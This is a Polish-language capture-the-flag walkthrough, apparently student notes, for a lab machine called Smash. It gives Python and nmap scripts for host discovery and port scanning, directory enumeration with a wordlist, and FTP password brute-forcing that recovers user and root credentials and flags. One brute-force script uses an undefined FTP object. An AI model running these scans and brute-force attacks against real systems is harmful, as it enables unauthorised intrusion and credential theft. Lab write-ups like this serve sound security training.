@@ -1,0 +1,139 @@
+Ustalenie adresu ip za pomoca kodu pythonowego
+
+import os
+abc = os.popen('hostname -I').read()
+print(abc)
+
+oraz maski podsieci w python
+
+import os
+abc = os.popen('ifconfig').read()
+print(abc)
+
+Adres maski podsieci to 255.255.255.0
+
+Korzystam z sieci zmostkowanej w wyniku czego znaleziono rowniez prywatne
+urządzenia. 
+
+Ustalenie adresu ip innych aktywnych hostów w tej samej sieci 
+za pomoca kodu pythonowego:
+
+from scapy.all import *
+from scapy.layers.inet import *
+for ip in range(110, 140):
+    adres = "192.168.1." + str(ip)
+    packet = IP(dst=adres, ttl=20)/ICMP()
+    reply = sr1(packet, timeout=2)
+    if reply:
+         print(adres, "is online")
+    else:
+        print(adres, "DOWN")
+
+
+
+za pomoca komendy nmap -n -v 192.168.1.0/24
+Adres ip szukanej maszyny to 192.168.1.131
+Został wyszukany równiez dwa kolejne aktywne hosty w sieci.
+
+Sprawdzanie wyszukanej maszyny za pomoca komendy nmap -n -v -A 192.168.1.131
+Szukana maszyna ma nazwe Smash.
+
+
+Skanowanie portów za pomocą pythonowego kodu:
+
+from scapy.layers.inet import *
+otwarte_porty = []
+for port in range(1, 100):
+    pakiet = IP(dst="192.168.1.131")/TCP(dport=port, sport=random.randint(20000, 30000), flags="S")
+    response = sr1(pakiet)
+    if str(response.getlayer(TCP).flags) == "SA":
+        otwarte_porty.append(port)
+print(otwarte_porty)
+
+
+Dla szukanej maszyny pokazane sa otwarte porty 21, 22, 80.
+Dla kolejnych hostow nie pokazano otwartych portów.
+
+
+
+
+Po wejsciu na strone hhtp maszyny w zakladce elements nalezalo poszukac
+fragmentu TEKSTU ENCODOWANEGO na samym dole 
+RW51bWVyYXRlIG1lIHdpdGggZGlyZWN0b3J5LWxpc3QtbG93ZXJjYXNlLTIuMy1tZWRpdW0udHh0 
+do rozkodowania metodą base64. Po rozkodowaniu uzyskana zostala podpowiedz:
+Enumerate me with directory-list-lowercase-2.3-medium.txt
+Po wpisaniu w przegladarke nazwy tego pliku wyskakuje lista do enumeracji podstron.
+
+
+Nastepnie nalezy wykonac enumeracje za pomoca kodu pythona
+import requests
+with open("/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt", encoding="utf-8") as f:
+    directories = f.readlines()
+    for dir in directories:
+        dir = dir.strip()
+        url = f"http://192.168.1.131/{dir}"
+        response = requests.get(url)
+        if response.status_code != 404:
+            print(url)
+
+na stronie wpisac 192.168.1.131/requests
+
+
+Teraz nalezy skorzystac z metody Bruteforce FTP w celu złamania loginu i hasła
+do maszyny SDA, aby zdobyć flagę użytkownika z pliku user.txt w katalogu użytkownika:
+Login to uranus a hasło to butterfly.
+Flaga z pliku user.txt to flag{h4ck3r}
+
+
+
+ import ftplib
+ users = ["mercury", "venus", "earth", "mars", "jupiter", "saturn", "uranus", "neptune"]
+ with open("/usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt", encoding="utf-8") as f:
+     passwords = f.readlines()
+     targethost = "192.168.1.131"
+     clean_users=[]
+     clean_passwords=[]
+     for user in users:
+         clean_users.append(user.strip())
+     for passwd in passwords:
+         clean_passwords.append(passwd.strip())
+     for user in clean_users:
+         for passwd in clean_passwords:
+             print(user, passwd)
+             try:
+                 ftpserver.connect(targethost, 21, timeout=2)
+                 ftpserver.login(user, passwd)
+                 print("SUKCES", user, passwd)
+                 ftpserver.close()
+             except:
+                 pass
+
+
+W tym momencie pozostało znalezienie pliku root.txt w katalogu roota.
+Plik do encodowania metoda base64 nosi nazwę hint.jpg
+Tresc do encodowania to cm9vdCBwYXNzd29yZCBpbiBhIDMtZGlnaXQgY29kZQ
+Tresc po encodowaniu to root password in a 3-digit code.
+Pozostało złamanie kodu metodą Bruteforce FTP w celu zdobycia flagi roota.
+
+ftpserver = ftplib.FTP()
+for code in range(100, 999):
+    print(code)
+    try:
+        ftpserver.connect("192.168.1.131", 21, timeout=5)
+        ftpserver.login("root", str(code))
+        print("SUKCES", code)
+        ftpserver.close()
+    except:
+        pass
+
+Kod uzyskany podczas FTP Bruteforce to 666.
+
+Nastepnie nalezy sie zalogowac na roota za pomoca komendy
+ssh root@192.168.1.131 podajac haslo 666
+
+i otworzyć plik root.txt. Tam znajduje sie flaga flag{1337}
+
+
+
+
+
